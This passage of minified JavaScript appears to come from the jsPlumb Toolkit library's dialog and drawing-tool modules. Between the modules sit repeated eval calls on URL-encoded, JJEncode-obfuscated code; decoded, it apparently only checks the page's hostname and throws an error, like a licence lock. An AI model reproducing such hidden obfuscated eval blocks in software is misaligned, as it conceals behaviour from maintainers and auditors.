ow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22=%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),function(){var n,t,e,o,i,r,d,_,s,a,w,l,u=this,c=u.jsPlumb,B=u.Rotors,h={},j={ok:"OK",cancel:"Cancel"},p=document.body,f=!1,g=B.newInstance({templateResolver:function(n){return C[n]||document.getElementById(n).innerHTML}}),m={},v=!0,C={};c.ready(function(){(n=document.createElement("div")).className="jtk-dialog-underlay",c.on(n,"click",function(){N(!0)}),(t=document.createElement("div")).className="jtk-dialog-overlay",(e=document.createElement("div")).className="jtk-dialog-title",t.appendChild(e),(o=document.createElement("div")).className="jtk-dialog-content",t.appendChild(o),(i=document.createElement("div")).className="jtk-dialog-buttons",t.appendChild(i)});var b=function(n){if(i.innerHTML="",n.buttons)for(var t,e=0;e<n.buttons.length;e++)t=n.buttons[e],i.appendChild(t),"true"===t.getAttribute("jtk-commit")?c.on(t,"click",function(){N()}):"true"===t.getAttribute("jtk-cancel")&&c.on(t,"click",function(){N(!0)});else(w=document.createElement("button")).className="jtk-dialog-button jtk-dialog-button-ok",w.innerHTML=j.ok,i.appendChild(w),c.on(w,"click",function(){N()}),(l=document.createElement("button")).className="jtk-dialog-button jtk-dialog-button-cancel",l.innerHTML=j.cancel,l.setAttribute("jtk-cancel","true"),i.appendChild(l),c.on(l,"click",function(){N(!0)}),w.innerHTML=n.labels&&n.labels.ok||j.ok,l.innerHTML=n.labels&&n.labels.cancel||j.cancel},y=function(){for(var n=i.children,t=0;t<n.length;t++)n[t].parentNode.removeChild(n[t])},D={x:function(n,e,o){var i=(p.clientWidth-o[0])/2,r=window.pageXOffset||n.scrollLeft||document.body.scrollLeft;i<0&&(i=10),r=e?r:p.scrollLeft,t.style.left=i+r+"px"},y:function(n,e,o){var i=.1*p.clientHeight,r=window.pageYOffset||n.scrollTop||document.body.scrollTop;i<0&&(i=10),r=e?r:p.scrollTop,t.style.top=i+r+"px"}},P=function(){if(f){var e=document.documentElement,o=c.getSize(t),i=p==document.body,r=t.getAttribute("data-axis");n.style.position=i?"fixed":"absolute",D[r](e,i,o)}},E=function(n){27==n.keyCode&&N(!0)},x=function(n,t,e){for(var o=e.querySelectorAll("[jtk-att]"),i=0;i<o.length;i++){var r=o[i].tagName.toUpperCase(),d="INPUT"===r?(o[i].getAttribute("type")||"TEXT").toUpperCase():r,_=o[i].getAttribute("jtk-att"),s=g.data(t,_);null!=s&&A[d](o[i],s),n&&o[i].getAttribute("jtk-commit")&&("INPUT"===r?c.on(o[i],"keyup",function(n){10!==n.keyCode&&13!==n.keyCode||N()}):"TEXTAREA"===r&&c.on(o[i],"keyup",function(n){!n.ctrlKey||10!==n.keyCode&&13!==n.keyCode||N()}))}},A={TEXT:function(n,t){n.value=t},RADIO:function(n,t){n.checked=n.value==t},CHECKBOX:function(n,t){n.checked=1==t},SELECT:function(n,t){for(var e=0;e<n.options.length;e++)if(n.options[e].value==t)return void(n.selectedIndex=e)},TEXTAREA:function(n,t){n.value=t},COLOR:function(n,t){n.value=t},HIDDEN:function(n,t){n.value=t}},S={TEXT:function(n){return n.value},RADIO:function(n){if(n.checked)return n.value},CHECKBOX:function(n){if(n.checked)return!0},SELECT:function(n){return-1!=n.selectedIndex?n.options[n.selectedIndex].value:null},TEXTAREA:function(n){return n.value},COLOR:function(n){return n.value},HIDDEN:function(n){return n.value}},I={TEXT:function(n){n.value=""},RADIO:function(n){n.checked=!1},CHECKBOX:function(n){n.checked=!1},SELECT:function(n){n.selectedIndex=-1},TEXTAREA:function(n){n.value=""},COLOR:function(n){n.value=""},HIDDEN:function(n){n.value=""}},k=function(n,t){for(var e=0;e<n.length;e++)if(n[e]!==t){var o=n[e].tagName.toUpperCase(),i="INPUT"===o?(n[e].getAttribute("type")||"TEXT").toUpperCase():o,r=I[i];r&&r(n[e])}},T=function(n){for(var t=n.querySelectorAll("[jtk-att]"),e={},o=0;o<t.length;o++){var i=t[o].tagName.toUpperCase(),r="INPUT"===i?(t[o].getAttribute("type")||"TEXT").toUpperCase():i,d=S[r](t[o]),_=t[o].getAttribute("jtk-att");if(null!=d){var s=g.data(e,_);null!=s?(jsPlumbUtil.isArray(s)||(s=[s],g.data(e,_,s)),s.push(d)):g.data(e,_,d)}}return e},M=function(n,t){try{null!=n&&n.apply(n,Array.prototype.slice.apply(arguments,[1]))}catch(n){}},N=function(e){var i=e?null:T(o);(e||null==s||!1!==s(i))&&(f=!1,n.style.display="none",t.style.display="none",c.off(document,"keyup",E),c.off(window,"resize",P),c.off(window,"scroll",P),c.removeClass(t,"jtk-dialog-overlay-visible"),c.removeClass(t,"jtk-dialog-overlay-top"),c.removeClass(t,"jtk-dialog-overlay-bottom"),c.removeClass(t,"jtk-dialog-overlay-left"),c.removeClass(t,"jtk-dialog-overlay-right"),c.removeClass(t,"jtk-dialog-overlay-x"),c.removeClass(t,"jtk-dialog-overlay-y"),t.setAttribute("data-position",""),t.setAttribute("data-axis",""),p.removeChild(n),p.removeChild(t),y(),e?(M(m.onCancel,o),M(d,o)):(M(m.onOK,i,o),M(r,i,o)),M(m.onClose),M(a),r=d=_=a=s=null)};u.jsPlumbToolkit.Dialogs={initialize:function(n){if(h={},(n=n||{}).dialogs)for(var t in n.dialogs)C[t]=n.dialogs[t][0],h[t]={content:C[t],title:n.dialogs[t][1]||"",cancelable:!1!==n.dialogs[t][2]};else for(var e=n.selector||".jtk-dialog",o=c.getSelector(e),i=0;i<o.length;i++){var r=o[i].getAttribute("id");null!=r&&(h[r]={content:o[i].innerHTML,title:o[i].getAttribute("title")||"",el:o[i],cancelable:"false"!==o[i].getAttribute("cancel")})}n.labels&&c.extend(j,n.labels),n.globals&&c.extend(m,n.globals)},show:function(w){var l;if(w.id&&h[w.id]){v=!1!==w.reposition,r=w.onOK,d=w.onCancel,_=w.onOpen,s=w.onMaybeClose,a=w.onClose;var u=w.position||"top",B="jtk-dialog-overlay-"+u,j="top"===u||"bottom"===u?"x":"y",C="jtk-dialog-overlay-"+j;b(w),p=function(n){return null==n?document.body:"string"==typeof n?document.getElementById(n):n}(w.container);var y=w.data||{},D=g.template(w.id,y);e.innerHTML=w.title||h[w.id].title||"",o.innerHTML="";var A=D.childNodes.length;for(l=0;l<A;l++)o.appendChild(D.childNodes[0]);p.appendChild(n),p.appendChild(t),c.addClass(t,B),c.addClass(t,C),n.style.display="block",t.style.display="block",t.setAttribute("data-position",u),t.setAttribute("data-axis",j);var S=h[w.id].cancelable?"visible":"hidden",I=i.querySelectorAll("[jtk-cancel='true']");for(l=0;l<I.length;l++)I[l].style.visibility=S;f=!0,P(),x(!0,y,o),c.on(document,"keyup",E),v&&(c.on(window,"resize",P),c.on(window,"scroll",P)),c.on(t,"click","[jtk-clear]",function(n){var e=this.getAttribute("jtk-att");e&&k(t.querySelectorAll("[jtk-att='"+e+"']:not([jtk-clear])"),this)}),c.on(t,"click","[jtk-clear-all]",function(n){k(t.querySelectorAll("[jtk-att]:not([jtk-clear])"),this)}),m.onOpen&&m.onOpen(t),_&&_(t),c.addClass(t,"jtk-dialog-overlay-visible");try{var T=o.querySelector("[jtk-focus]");T&&setTimeout(function(){T.focus()},0)}catch(w){}}},hide:function(){N(!0)},clear:k,apply:x.bind(null,!1),extract:T},"undefined"!=typeof exports&&(exports.Dialogs=u.jsPlumbToolkit.Dialogs)}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22=%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),function(){this.jsPlumbToolkit.DrawingTools=function(n){var t,e,o,i,r,d,_,s,a,w=n.renderer,l=w.getToolkit(),u=w.getJsPlumb(),c={},B=n.widthAttribute||"w",h=n.heightAttribute||"h",j=n.leftAttribute||"left",p=n.topAttribute||"top",f=function(n,t,e,o){var i=document.createElement(n);if(t&&(i.className=t),e&&e.appendChild(i),o)for(var r in o)i.setAttribute(r,o[r]);return i},g=function(n,t){var e=t.getRenderedNode(n.id);return function(n){var t=c[n];t&&t[0]&&t[0].parentNode&&t[0].parentNode.removeChild(t[0]),delete c[n]}(n.id),e},m=function(n,o,i,r){var w={};return w[B]=t?i:_-d,w[h]=e?r:a-s,w[j]=t?n:d,w[p]=e?o:s,w},v={tl:function(n,t){var e=d+n,o=s+t,i=_-e,r=a-o;return e>=_&&(i=e-_,e=_),o>=a&&(r=o-a,o=a),m(e,o,i,r)},tr:function(n,t){var e=_-d+n,o=s+t,i=a-o,r=d;return e<=0&&(r=d+e,e*=-1),o>=a&&(i=o-a,o=a),m(r,o,e,i)},bl:function(n,t){var e=d+n,o=a-s+t,i=_-e,r=s;return e>=_&&(i=e-_,e=_),o<=0&&(r+=o,o*=-1),m(e,r,i,o)},br:function(n,t){var e=_-d+n,o=a-s+t,i=d,r=s;return e<=0&&(i=d+e,e*=-1),o<=0&&(r+=o,o*=-1),m(i,r,e,o)}};l.bind("selectionCleared",function(){!function(){for(var n in c){var t=c[n];t[0]&&t[0].parentNode&&t[0].parentNode.removeChild(t[0]),delete c[n]}}()}),l.bind("select",function(n){!function(n,t){var e=g(n,t);if(null!=e){var o=f("div","jtk-draw-skeleton",e),i=e.getAttribute("jtk-x-resize"),r=e.getAttribute("jtk-y-resize");f("div","jtk-draw-drag",o),f("div","jtk-draw-handle jtk-draw-handle-tl",o,{"data-dir":"tl","data-node-id":n.id}),f("div","jtk-draw-handle jtk-draw-handle-tr",o,{"data-dir":"tr","data-node-id":n.id}),f("div","jtk-draw-handle jtk-draw-handle-bl",o,{"data-dir":"bl","data-node-id":n.id}),f("div","jtk-draw-handle jtk-draw-handle-br",o,{"data-dir":"br","data-node-id":n.id}),c[n.id]=[o,"false"!==i,"false"!==r]}}(n.obj,w)}),l.bind("deselect",function(n){g(n.obj,w)});var C=function(n){var t=w.mapEventLocation(n),e=t.left-o.left,d=t.top-o.top,_=i(e,d,"");l.updateNode(r,_),w.setPosition(r,_[j],_[p],!0)},b=function n(t){w.storePositionInModel(r.id),u.removeClass(document.body,"jtk-drag-select-defeat"),u.off(document,"mousemove",C),u.off(document,"mouseup",n),jsPlumbUtil.consume(t)};u.on(document,"mousedown",".jtk-draw-handle",function(n){var B=this.getAttribute("data-dir"),h=this.getAttribute("data-node-id");r=l.getNode(h),t=c[h][1],e=c[h][2],o=w.mapEventLocation(n);var j=w.getCoordinates(r);d=j.x,s=j.y,_=d+j.w,a=s+j.h,i=v[B],u.addClass(document.body,"jtk-drag-select-defeat"),u.on(document,"mousemove",C),u.on(document,"mouseup",b)})},"undefined"!=typeof exports&&(exports.DrawingTools=this.jsPlumbToolkit.DrawingTools)}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22=%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B"))}});